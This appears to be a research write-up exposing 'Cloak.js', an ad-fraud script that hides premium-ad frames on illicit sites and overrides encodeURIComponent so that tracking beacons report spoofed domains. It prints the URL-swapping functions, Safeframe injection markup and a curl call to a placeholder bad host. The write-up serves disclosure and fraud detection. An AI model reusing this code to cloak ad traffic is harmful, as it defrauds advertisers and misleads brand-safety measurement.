## How Cloak.js Works - Step By Step

Cloak.js is a sophisticated script that runs on illicit publisher websites - creating a series of frames, and rewriting browser functions so that ads are misled as to which website domain they are running on.

A diagram of the web framework of Cloak.js is as follows:

![Cloak Technical Diagram](https://docs.google.com/drawings/d/1tpHKLpWhPU5ghhkoj_CqBFezLwqSCrd5W7W3nS8IrgQ/pub?w=948&h=692)

[edit this drawing](https://docs.google.com/drawings/d/1tpHKLpWhPU5ghhkoj_CqBFezLwqSCrd5W7W3nS8IrgQ/edit)

**Step 1:  Illicit Publisher Sells Web Space**

Illicit Publishers sell their web space to an illicit ad network willing to buy their adspace.

**Step 2:  Illicit Ad Network Displays a Low Value Ad**

The illicit ad network displays an ad expected by the publisher (e.g. a gaming ad, or some other ad category that does not care about displaying on an illicit publisher).  Next to this ad (and invisible on the illicit publisher page), a Google [Safeframe](http://www.iab.com/guidelines/safeframe/) is created.  This is where the fraudulent activity begins.

The original ad script on the web page looks like this

```
<script src="//go.nasty.com/?id=423806"></script>
```

This script loads two frames.  The inner frame is set to refresh every 5 seconds, so that many ads appear in a single user visit.  

Here is an example of the "real ad:"

![cloak.js real ad](img/300x250.gif?raw=true)

**Step 3:  Cloaking Environment is Built**

Code is injected inside the Safeframe (please see [Notes on Safeframe](#Notes-on-Safeframe) for a more elaborate viewpoint on this).  This code retrieves two lists from the illicit ad network's servers:  

1. a list of publisher SSP accounts that are used to place supply into the Open RTB ecosystem; and
1. a list of premium website domains that will be used to mask the actual URL of the publisher page

Here is how to call the script that delivers these lists:

```
curl 'http://<bad_url>/b/373877463' -H 'Referer: http://tpc.googlesyndication.com/safeframe/1-0-1/html/container.html'
```

Here are some example cloaked URLs that are returned from this web request:

```
http://www.wikia.com
http://www.viralboom.com
http://www.wordfind.com
http://www.westernjournalism.com
http://www.washingtontimes.com
http://www.muscleandfitness.com
http://www.wowhead.com
http://www.babycenter.com
http://www.hometalk.com
http://www.freehealthnow.com
http://www.worldlifestyle.com
http://www.247sports.com
```

Here is the Google Safeframe invocation code:

```
<iframe name="1-0-1;118;<img width=&quot;1&quot; height=&quot;1&quot; id=&quot;spoint&quot; /><script src=&quot;http://<bad_url>/b/373877463&quot; type=&quot;text/javascript&quot;></script>" src="http://tpc.googlesyndication.com/safeframe/1-0-1/html/container.html" marginwidth="0" marginheight="0" scrolling="No" hspace="0" vspace="0" style="position: absolute; width:100%; height:100%;" sandbox="allow-same-origin allow-forms allow-pointer-lock allow-scripts" align="top" frameborder="0" height="100%"></iframe>
```


**Step 4:  Exchange Ads are Loaded**

Next, a series of 10 Safeframes are created inside of the initial Safeframe.  These are the frames that will be cloaked and will host a premium ad creative.  Ad code is injected into each frame, which performs two functions:

1. Rewrite key Javascript functions to make the environment appear to be a different website
1. Add publisher ad code to place an RTB request into an open exchange.  

Note that all 10 of these Safeframes cannot be seen when looking at the illicit publisher web page.  Therefore, nobody notices an out-of-place premium brand displaying on an illicit publisher.

**Step 5:  Ad Data is Modified with Cloaked Domain**

The advertiser ad tag calls a Javascript function to package their data to send back to their servers.  When it packages up the URL of the website domain to send back to its servers, the function to do this swaps the illicit URL with another well known url.

Here are the Javascript functions that are overridden by the Cloak script:

```
encodeURIComponent
escape
```

Here is some pseudo-code which can easily override these functions:

```
var oldEncode = window.encodeURIComponent;
window.encodeURIComponent = function(component){
  var alteredComponent = doSomethingWithComponent(component)
  oldEncode(alteredComponent)
}
```

Here is the code which actually swaps URLs when they are encoded:

```
function privateEncode(str,type)
{
  for(var match in mapping)
  {
    if(match.length > 0)
    {
      var re = new RegExp(match.trim(),"gi");
      //force string type
      str = "" + str;
      //str = str.toString();
      str = str.replace(re,mapping[match]);
      str = str.replace(match.trim(),mapping[match]);
    }
  }
  return privateFinish(type(str),type);
}

function privateFinish(str,type)
{
  for(var match in mapping)
  {
    if(match.length > 0)
    {
      var re = new RegExp(type(match.trim()),"ig");
      str = str.replace(re,mapping[match]);
      str = str.replace(type(match.trim()),mapping[match]);
    }
  }
  return str;
}
```

As an example, the bad url:

```
http://streamingsite.com/free-movie.com
```

is reported in advertiser and tracking beacons as `http://www.bikeforums.net/general-cycling-discussion/1038733-unicycling.html`, eg:

```
http://beacon.example.com/beacon.gif?ref=www.bikeforums.net%2Fgeneral-cycling-discussion%2F1038733-unicycling.html
```

Every digital advertising and brand safety company that we have tested use the modified functions to encode their URLs, and therefore report the incorrect URL to their clients.

**Step 6:  Cloak is Complete**

At this point, all subsequent activity in the advertising supply chain uses the cloaked URL above.  Any attempt to directly measure the URL will report the cloaked url.

Here is a link to the CLOAK.js source code:

[cloak.js](js/cloak.js)
